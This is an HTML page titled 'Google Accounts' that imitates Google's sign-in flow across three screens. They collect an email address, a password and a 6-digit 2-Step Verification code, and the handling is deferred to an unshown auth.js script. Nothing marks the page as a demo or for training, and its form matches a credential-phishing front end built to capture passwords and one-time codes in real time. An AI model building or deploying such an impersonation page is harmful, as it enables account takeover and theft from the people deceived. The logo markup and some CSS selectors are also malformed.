<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Accounts</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Roboto', Arial, sans-serif;
        }
        body {
            background-color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 448px;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            margin: 20px;
        }
        .google-logo {
            text-align: center;
            margin-bottom: 16px;
        }
        .google-logo svg {
            width: 75px;
            height: 24px;
        }
        h1 {
            text-align: center;
            font-size: 24px;
            font-weight: 400;
            margin-bottom: 8px;
        }
        .subtitle {
            text-align: center;
            color: #5f6368;
            margin-bottom: 24px;
        }
        .input-container {
            margin-bottom: 24px;
        }
        input[type="email"],
        input[type="password"],
        input[type="text"] {
            width: 100%;
            padding: 13px 15px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            font-size: 16px;
            transition: border 0.2s;
        }
        input:focus {
            border: 1px solid #1a73e8;
            outline: none;
        }
        .forgot-email {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        .disclaimer {
            color: #5f6368;
            font-size: 14px;
            margin: 32px 0;
            line-height: 1.4286;
        }
        .disclaimer a {
            color: #1a73e8;
            text-decoration: none;
        }
        .button-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .create-account {
            color: #1a73e8;
            font-weight: 500;
            text-decoration: none;
            font-size: 14px;
        }
        .next-button {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 10px 24px;
            border-radius: 4px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }
        .next-button:hover {
            background: #1b66c9;
        }
        .2fa-container {
            text-align: center;
        }
        .2fa-code {
            font-size: 32px;
            letter-spacing: 8px;
            text-align: center;
            margin: 20px 0;
        }
        .device-image {
            text-align: center;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="google-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 75 24">
                <path d="M67.954 16.303c-1.096 0-2.07-.49-2.756-1.267l.13-1.08 1.065-.114c.7.675 1.567 1.073 2.55 1.073.733 0 1.32-.22 1.32-.62 0-.328-.288-.5-1.032-.732l-1.1-.328c-1.32-.4-2.19-1.14-2.19-2.45 0-1.56 1.27-2.67 3.22-2.67.95 0 1.72.3 2.34.86l-.12 1.02-1.01.13c-.55-.47-1.17-.73-1.86-.73-.64 0-1.15.22-1.15.58 0 .35.33.52 1.12.75l1.1.33c1.42.43 2.2 1.16 2.2 2.5 0 1.68-1.35 2.78-3.48 2.78zm-9.75-2.8c0 2.27-1.22 3.9-3.5 3.9-2.03 0-3.6-1.5-3.6-3.9 0-2.4 1.57-3.9 3.6-3.9 2.28 0 3.5 1.63 3.5 3.9zm-1.8 0c0-1.52-.75-2.6-1.7-2.6-.95 0-1.7 1.08-1.7 2.6 0 1.52.75 2.6 1.7 2.6.95 0 1.7-1.08 1.7-2.6zm-10.2 3.9c-2.28 0-3.5-1.63-3.5-3.9 0-2.4 1.57-3.9 3.6-3.9 2.03 0 3.6 1.5 3.6 3.9 0 2.27-1.22 3.9-3.5 3.9zm0-1.6c.95 0 1.7-1.08 1.7-2.6 0-1.52-.75-2.6-1.7-2.6-.95 0-1.7 1.08-1.7 2.6 0 1.52.75 2.6 1.7 2.6zm-8.5-2.3c0 2.27-1.22 3.9-3.5 3.9-2.03 0-3.6-1.5-3.6-3.9 0-2.4 1.57-3.9 3.6-3.9 2.28 0 3.5 1.63 3.5 3.9zm-1.8 0c0-1.52-.75-2.6-1.7-2.6-.95 0-1.7 1.08-1.7 2.6 0 1.52.75 2.6 1.7 2.6.95 0 1.7-1.08 1.7-2.6z"></path>
            </svg>
        </div>
        
        <div id="emailScreen">
            <h1>Sign in</h1>
            <div class="subtitle">Use your Google Account</div>
            
            <div class="input-container">
                <input type="email" id="email" placeholder="Email or phone">
            </div>
            
            <div class="disclaimer">
                Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a>
            </div>
            
            <div class="button-container">
                <a href="#" class="create-account">Create account</a>
                <button class="next-button" onclick="handleEmail()">Next</button>
            </div>
        </div>

        <div id="passwordScreen" style="display: none;">
            <h1>Welcome</h1>
            <div class="subtitle" id="userEmail">user@example.com</div>
            
            <div class="input-container">
                <input type="password" id="password" placeholder="Enter your password">
            </div>
            
            <div class="button-container">
                <a href="#" class="forgot-email">Forgot password?</a>
                <button class="next-button" onclick="handlePassword()">Next</button>
            </div>
        </div>

        <div id="twoFactorScreen" style="display: none;">
            <h1>2-Step Verification</h1>
            <div class="subtitle">Enter the 6-digit code from your Google Authenticator app</div>
            
            <div class="device-image">
                <svg width="96" height="96" viewBox="0 0 24 24">
                    <path fill="#5F6368" d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V5h10v14z"/>
                </svg>
            </div>
            
            <div class="input-container">
                <input type="text" id="twoFactorCode" placeholder="Enter 6-digit code" maxlength="6">
            </div>
            
            <div class="button-container">
                <a href="#" class="forgot-email">Try another way</a>
                <button class="next-button" onclick="handle2FA()">Verify</button>
            </div>
        </div>
    </div>

    <script src="auth.js"></script>
</body>
</html>
